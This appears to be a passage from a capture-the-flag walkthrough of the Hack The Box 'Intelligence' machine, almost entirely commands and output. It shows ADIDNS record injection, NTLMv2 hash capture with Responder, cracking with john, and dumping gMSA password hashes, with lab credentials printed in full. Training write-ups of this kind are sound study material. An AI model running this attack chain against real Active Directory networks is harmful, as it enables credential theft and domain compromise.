   3   │ foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
   4   │ try {
   5   │ $request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
   6   │ if(.StatusCode -ne 200) {
   7   │ Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
   8   │ }
   9   │ } catch {}
  10   │ }

```

### Creating a DNS Record (dnstool.py) [Abusing ADIDNS]


```
└─# python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -r websavi -a add -t A -d 10.10.14.2 10.10.10.248
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully

```
```
└─# responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.4.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.2]
    Responder IPv6             [dead:beef:2::1000]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']

[+] Current Session Variables:
    Responder Machine Name     [WIN-YJ9D3UMATA5]
    Responder Domain Name      [TBT8.LOCAL]
    Responder DCE-RPC Port     [47718]

[+] Listening for events...

[HTTP] NTLMv2 Client   : 10.10.10.248
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:a44829a908ea551d:C7959067D0502E2283634378D2E7B1DA:01010000000000005C4E3C13F2D8DA01439B0489CBAC1F5A0000000002000800540042005400380001001E00570049004E002D0059004A0039004400330055004D0041005400410035000400140054004200540038002E004C004F00430041004C0003003400570049004E002D0059004A0039004400330055004D0041005400410035002E0054004200540038002E004C004F00430041004C000500140054004200540038002E004C004F00430041004C00080030003000000000000000000000000020000017D889F22EF14DC9E57FEFF045FEBE14A32F6932ECCF9622FBF2D1548B372E660A0010000000000000000000000000000000000009003A0048005400540050002F0077006500620073006100760069002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000

```

```
└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Mr.Teddy         (Ted.Graves)
1g 0:00:00:28 DONE (2024-07-17 22:12) 0.03503g/s 378958p/s 378958c/s 378958C/s Mrz.deltasigma..Morgant1
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.


```

```
─# crackmapexec smb 10.10.10.248 -u 'Ted.Graves' -p 'Mr.Teddy'
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Ted.Graves:Mr.Teddy

```

```
└─# bloodhound-python -c all -u 'Ted.Graves' -p 'Mr.Teddy' -ns 10.10.10.248 -d intelligence.htb     
INFO: Found AD domain: intelligence.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc.intelligence.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc.intelligence.htb
INFO: Found 43 users
INFO: Found 55 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: svc_int.intelligence.htb
INFO: Querying computer: dc.intelligence.htb
WARNING: Could not resolve: svc_int.intelligence.htb: The resolution lifetime expired after 3.204 seconds: Server Do53:10.10.10.248@53 answered The DNS operation timed out.; Server Do53:10.10.10.248@53 answered The DNS operation timed out.
INFO: Done in 00M 35S


```
```
└─# git clone https://github.com/micahvandeusen/gMSADumper
Cloning into 'gMSADumper'...
remote: Enumerating objects: 54, done.
remote: Counting objects: 100% (54/54), done.
remote: Compressing objects: 100% (38/38), done.
remote: Total 54 (delta 22), reused 37 (delta 14), pack-reused 0
Receiving objects: 100% (54/54), 38.20 KiB | 9.55 MiB/s, done.
Resolving deltas: 100% (22/22), done.
                                                                                                
                                                                                                
┌──(root㉿kali)-[/home/…/htb/Intelligence/exploits/gMSADumper]
└─# python3 gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -l 10.10.10.248 -d intelligence.htb
Users or groups who can read password for svc_int$:
 > DC$
 > itsupport
svc_int$:::745bd2c68dfc101a74f48d87027c7dc6
svc_int$:aes256-cts-hmac-sha1-96:8b2e9edb20258a45ad9084c89e7df761f3b85da5abd92849c150d4ed43f1056f
svc_int$:aes128-cts-hmac-sha1-96:798345b20bd9a8866a87b351c0ad68f3


```

